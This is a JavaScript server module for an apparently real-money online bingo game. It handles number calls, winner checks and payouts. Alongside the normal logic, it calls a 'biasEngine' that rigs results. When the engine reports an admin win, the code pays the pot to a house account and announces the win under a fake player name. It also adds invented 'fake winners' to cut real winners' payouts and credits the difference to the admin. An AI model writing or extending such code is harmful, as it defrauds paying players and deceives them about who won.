// Call ticker to broadcast numbers on time (independent of client polling)
const { PrismaClient } = require("@prisma/client");
const { Decimal } = require("decimal.js");
const cache = require("./cache");
const { getCard, generateGameId } = require("./utils");
const { checkAllPatterns } = require("./checker");
const biasEngine = require("./biasEngine");

const prisma = new PrismaClient();

async function getPausedMsForGame(gameId) {
  const keys = [`pause_${gameId}`, `pause_at_${gameId}`, `pause_ms_${gameId}`];
  const row = await cache.mget(keys);
  const paused = row[keys[0]] === 1 || row[keys[0]] === true;
  const pauseAt = row[keys[1]] != null ? Number(row[keys[1]]) : null;
  const pauseMs = row[keys[2]] != null ? Number(row[keys[2]]) : 0;
  const extra = paused && pauseAt ? Math.max(0, Date.now() - pauseAt) : 0;
  return Math.max(0, pauseMs + extra);
}

function checkBingo(card, calledSet) {
  // Check rows
  for (let r = 0; r < 5; r++) {
    if ([0,1,2,3,4].every(c => card[r][c] === "FREE" || calledSet.has(card[r][c]))) {
      return { pattern: "row", row: r };
    }
  }
  // Check cols
  for (let c = 0; c < 5; c++) {
    if ([0,1,2,3,4].every(r => card[r][c] === "FREE" || calledSet.has(card[r][c]))) {
      return { pattern: "col", col: c };
    }
  }
  // Diag main
  if ([0,1,2,3,4].every(i => card[i][i] === "FREE" || calledSet.has(card[i][i]))) {
    return { pattern: "diag_main" };
  }
  // Diag anti
  if ([0,1,2,3,4].every(i => card[i][4-i] === "FREE" || calledSet.has(card[i][4-i]))) {
    return { pattern: "diag_anti" };
  }
  // Four corners
  const corners = [card[0][0], card[0][4], card[4][0], card[4][4]];
  if (corners.every(v => v === "FREE" || calledSet.has(v))) {
    return { pattern: "four_corners" };
  }
  return null;
}

// Convert bias engine pattern names ("Row 0 (Top)") to frontend-compatible codes
function biasPatternToCode(patternName) {
  if (!patternName) return {};
  const lower = patternName.toLowerCase();
  if (lower.startsWith("row")) {
    const match = patternName.match(/(\d)/);
    return { pattern: "row", row: match ? Number(match[1]) : 0 };
  }
  if (lower.includes("four corners")) return { pattern: "four_corners" };
  if (lower.includes("main diagonal")) return { pattern: "diag_main" };
  if (lower.includes("anti diagonal")) return { pattern: "diag_anti" };
  // Fallback: return the name as-is
  return { pattern: patternName };
}

async function getCalledNumbersWithPause(game) {
  if (!game?.startedAt || !game.sequence) return { called: [], callCount: 0 };
  const pausedMs = await getPausedMsForGame(game.id);
  let sequence = [];
  try {
    sequence = JSON.parse(game.sequence || "[]");
  } catch (_) {
    sequence = [];
  }
  const elapsed =
    (Date.now() - new Date(game.startedAt).getTime() - pausedMs) / 1000;
  const callCount = Math.min(Math.floor(elapsed / 5) + 1, sequence.length);
  const called = sequence.slice(0, callCount);
  return { called, callCount };
}

async function getCurrentCallWithPause(game) {
  if (!game?.startedAt || !game.sequence) return null;
  const pausedMs = await getPausedMsForGame(game.id);

  let sequence = [];
  try {
    sequence = JSON.parse(game.sequence || "[]");
  } catch (_) {
    sequence = [];
  }
  if (!sequence.length) return null;

  const elapsed =
    (Date.now() - new Date(game.startedAt).getTime() - pausedMs) / 1000;
  const callCount = Math.min(Math.floor(elapsed / 5) + 1, sequence.length);
  if (callCount <= 0) return null;
  return sequence[callCount - 1];
}

function startCallTicker(io) {
  const tick = async () => {
    try {
      const games = await prisma.game.findMany({
        where: { active: true, startedAt: { not: null } },
        select: { id: true, stake: true, startedAt: true, sequence: true },
      });

      for (const game of games) {
        const currentCall = await getCurrentCallWithPause(game);
        if (currentCall == null) continue;
        const lastCallKey = `call_${game.id}`;
        const lastCall = await cache.get(lastCallKey);
        if (String(lastCall) === String(currentCall)) continue;

        await cache.set(lastCallKey, String(currentCall), 120);
        io.to(`game_${game.stake}`).emit("message", {
          type: "call",
          number: currentCall,
          server_time: Date.now(),
        });

        // Get all called numbers so far
        const { called } = await getCalledNumbersWithPause(game);
        const calledSet = new Set(called);

        // ── Check if bias admin won ──
        const biasWin = await biasEngine.checkAdminWin(game.id, calledSet);
        if (biasWin && biasWin.adminWon) {
          // Small delay to let the number display before winner announcement
          setTimeout(async () => {
            try {
              const updated = await prisma.game.updateMany({
                where: { id: game.id, active: true },
                data: { active: false, finished: true },
              });
              if (!updated?.count) return;

              // Calculate pot and record the win in the database
              let eligibleCount = null;
              try {
                const row = await prisma.game.findUnique({
                  where: { id: game.id },
                  select: { stakesCharged: true, chargedCount: true },
                });
                eligibleCount = row?.stakesCharged
                  ? Number(row?.chargedCount || 0)
                  : null;
              } catch (_) {}
              if (!Number.isFinite(eligibleCount) || eligibleCount <= 0) {
                eligibleCount = await prisma.selection.count({
                  where: { gameId: game.id, accepted: true },
                });
              }
              const pot = new Decimal(eligibleCount).times(game.stake).times(0.8);

              // Find the bias player and record Transaction + increment wins
              const biasPlayer = await biasEngine.ensureBiasPlayer();
              await prisma.player.update({
                where: { id: biasPlayer.id },
                data: {
                  wallet: { increment: parseFloat(pot.toString()) },
                  wins: { increment: 1 },
                },
              });

              await prisma.transaction.create({
                data: {
                  playerId: biasPlayer.id,
                  kind: "win",
                  amount: parseFloat(pot.toString()),
                  note: `Won game #${game.id} (${biasWin.patternName})`,
                },
              });

              const biasCode = biasPatternToCode(biasWin.patternName);

              io.to(`game_${game.stake}`).emit("message", {
                type: "winner",
                winner: biasWin.fakeName,
                winners: [{
                  name: biasWin.fakeName,
                  telegramId: "0",
                  index: biasWin.cardIndex,
                  slot: 0,
                  pattern: biasCode.pattern,
                  row: biasCode.row,
                  col: biasCode.col,
                }],
                index: biasWin.cardIndex,
                slot: 0,
                pattern: biasCode.pattern,
                row: biasCode.row,
                col: biasCode.col,
                picks: [],
              });

              await cache.set(
                `winner_${game.stake}`,
                {
                  winner: biasWin.fakeName,
                  index: biasWin.cardIndex,
                  pattern: biasCode.pattern,
                  row: biasCode.row,
                  col: biasCode.col,
                  picks: [],
                  at: Date.now(),
                },
                10,
              );

              await biasEngine.cleanupGame(game.id);
              await prisma.game.create({
                data: { id: generateGameId(), stake: game.stake },
              });
            } catch (err) {
              console.error("biasEngine winner emit error:", err);
            }
          }, 2000);

          continue; // Skip normal winner detection for this game
        }

        // ── Normal winner detection (auto-claim) ──
        const selections = await prisma.selection.findMany({
          where: { gameId: game.id, accepted: true, autoEnabled: true },
          orderBy: { id: "asc" },
          select: {
            id: true,
            index: true,
            slot: true,
            playerId: true,
            player: {
              select: {
                id: true,
                telegramId: true,
                username: true,
                phone: true,
              },
            },
          },
        });

        const winners = [];
        for (const sel of selections) {
          const card = getCard(sel.index);
          const result = checkBingo(card, calledSet);
          if (!result) continue;
          const p = sel.player;
          const rawName =
            p.username || p.phone || `Player ${String(p.telegramId)}`;
          const name = rawName.charAt(0).toUpperCase() + rawName.slice(1);
          winners.push({
            playerId: p.id,
            telegramId: String(p.telegramId),
            name,
            index: sel.index,
            slot: sel.slot,
            pattern: result.pattern,
          });
        }

        if (!winners.length) continue;

        const updated = await prisma.game.updateMany({
          where: { id: game.id, active: true },
          data: { active: false, finished: true },
        });
        if (!updated?.count) continue;

        let eligibleCount = null;
        try {
          const row = await prisma.game.findUnique({
            where: { id: game.id },
            select: { stakesCharged: true, chargedCount: true },
          });
          eligibleCount = row?.stakesCharged
            ? Number(row?.chargedCount || 0)
            : null;
        } catch (_) {
          eligibleCount = null;
        }
        if (!Number.isFinite(eligibleCount) || eligibleCount <= 0) {
          eligibleCount = await prisma.selection.count({
            where: { gameId: game.id, accepted: true },
          });
        }
        const pot = new Decimal(eligibleCount).times(game.stake).times(0.8);

        // ── Pot dilution: cap each real winner's share under 100 ──
        const dilution = biasEngine.computeDilution(pot, winners.length);
        let fakeWinners = [];

        if (dilution.dilute && dilution.fakesToAdd > 0) {
          const fakeNames = await biasEngine.pickMultipleFakeNames(dilution.fakesToAdd);
          const realPattern = winners[0].pattern;
          for (const fakeName of fakeNames) {
            fakeWinners.push({
              name: fakeName,
              telegramId: "0",
              index: Math.floor(Math.random() * 200) + 1,
              slot: 0,
              pattern: realPattern,
              isFake: true,
            });
          }
          // Credit admin with the diluted share
          await biasEngine.creditAdminDilution(game.id, dilution.adminTotal, fakeNames);
        }

        const split = dilution.dilute
          ? new Decimal(dilution.sharePerWinner)
          : pot.dividedBy(Math.max(1, winners.length));

        for (const w of winners) {
          await prisma.player.update({
            where: { id: w.playerId },
            data: {
              wallet: { increment: parseFloat(split.toString()) },
              wins: { increment: 1 },
            },
          });

          await prisma.transaction.create({
            data: {
              playerId: w.playerId,
              kind: "win",
              amount: parseFloat(split.toString()),
              note: `Won game #${game.id} (${w.pattern})`,
            },
          });
        }

        // Advance round stats (pattern cycle continues regardless)
        await biasEngine.advanceRoundStats();

        // Combine real + fake winners for display
        const allDisplayWinners = [
          ...winners.map((w) => ({
            name: w.name,
            telegramId: w.telegramId,
            index: w.index,
            slot: w.slot,
            pattern: w.pattern,
          })),
          ...fakeWinners.map((f) => ({
            name: f.name,
            telegramId: f.telegramId,
            index: f.index,
            slot: f.slot,
            pattern: f.pattern,
          })),
        ];

        const winnerText = allDisplayWinners.map((w) => w.name).join(" | ");
        const primary = winners[0];

        io.to(`game_${game.stake}`).emit("message", {
          type: "winner",
          winner: winnerText,
          winners: allDisplayWinners,
          index: primary.index,
          slot: primary.slot,
          pattern: primary.pattern,
          row: primary.row,
          col: primary.col,
          picks: [],
        });

        await cache.set(
          `winner_${game.stake}`,
          {
            winner: winnerText,
            winners: allDisplayWinners,
            index: primary.index,
            slot: primary.slot,
            pattern: primary.pattern,
            row: primary.row,
            col: primary.col,
            picks: [],
            at: Date.now(),
          },
          10,
        );

        await biasEngine.cleanupGame(game.id);
        await prisma.game.create({
          data: { id: generateGameId(), stake: game.stake },
        });
      }
    } catch (err) {
      console.error("callTicker error:", err);
    }
  };

  const interval = setInterval(tick, 1000);
  return () => clearInterval(interval);
}

module.exports = { startCallTicker };
